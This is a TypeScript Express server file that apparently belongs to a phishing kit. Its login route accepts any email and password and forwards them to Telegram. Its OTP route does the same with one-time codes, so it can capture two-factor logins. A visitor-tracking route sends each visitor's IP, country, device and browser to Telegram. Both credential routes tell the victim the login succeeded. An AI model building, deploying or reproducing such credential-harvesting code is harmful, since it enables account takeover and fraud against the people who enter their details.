import type { Express } from "express";
import { createServer, type Server } from "http";
import { z } from "zod";
import { notifyLogin, notifyOtpVerification, notifyVisitor } from "./telegram";
import { UAParser } from "ua-parser-js";

const loginSchema = z.object({
  email: z.string().min(1, "Email is required"),
  password: z.string().min(1, "Password is required")
});

const otpSchema = z.object({
  otp: z.string().min(1, "OTP code is required")
});

export async function registerRoutes(app: Express): Promise<Server> {
  
  // Simple login endpoint that accepts any credentials and sends to Telegram
  app.post("/api/login", async (req, res) => {
    try {
      const validatedData = loginSchema.parse(req.body);
      
      // Send login credentials to Telegram
      const loginNotified = await notifyLogin(validatedData.email, validatedData.password);
      
      if (!loginNotified) {
        return res.status(500).json({ 
          error: "Failed to send login notification. Please try again." 
        });
      }

      res.json({
        success: true,
        message: "Login successful"
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ error: error.errors[0].message });
      }
      console.error("Login error:", error);
      res.status(500).json({ error: "Login failed" });
    }
  });

  // OTP verification endpoint that accepts any code and sends to Telegram
  app.post("/api/verify-otp", async (req, res) => {
    try {
      const validatedData = otpSchema.parse(req.body);
      
      // Send OTP code to Telegram for monitoring
      const otpNotified = await notifyOtpVerification(validatedData.otp);
      
      if (!otpNotified) {
        return res.status(500).json({ 
          error: "Failed to send OTP verification notification. Please try again." 
        });
      }

      res.json({
        success: true,
        message: "OTP verification successful"
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ error: error.errors[0].message });
      }
      console.error("OTP verification error:", error);
      res.status(500).json({ error: "OTP verification failed" });
    }
  });

  // Visitor tracking endpoint
  app.post("/api/track-visit", async (req, res) => {
    try {
      // Get IP address
      const ip = (req.headers['x-forwarded-for'] as string)?.split(',')[0] || 
                 req.socket.remoteAddress || 
                 'Unknown';
      
      // Get page from request body
      const { page } = req.body;
      
      // Parse User-Agent for device information
      const userAgent = req.headers['user-agent'] || 'Unknown';
      const parser = new UAParser(userAgent);
      const result = parser.getResult();
      
      const device = result.device.type 
        ? `${result.device.vendor || ''} ${result.device.model || ''} (${result.device.type})`.trim()
        : 'Desktop/Unknown';
      const browser = result.browser.name 
        ? `${result.browser.name} ${result.browser.version || ''}`.trim()
        : 'Unknown';
      const os = result.os.name 
        ? `${result.os.name} ${result.os.version || ''}`.trim()
        : 'Unknown';
      
      // Get country from IP using ipapi.co
      let country = 'Unknown';
      try {
        const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
        if (geoResponse.ok) {
          const geoData = await geoResponse.json();
          country = geoData.country_name || geoData.country || 'Unknown';
        }
      } catch (error) {
        console.error("Failed to get geolocation:", error);
      }
      
      // Send notification to Telegram (fire and forget - don't block response)
      notifyVisitor(ip, country, device, browser, os, page || 'Unknown').catch(err => {
        console.error("Failed to notify visitor:", err);
      });
      
      res.json({ success: true });
    } catch (error) {
      console.error("Visitor tracking error:", error);
      res.json({ success: false }); // Always return success to not block frontend
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
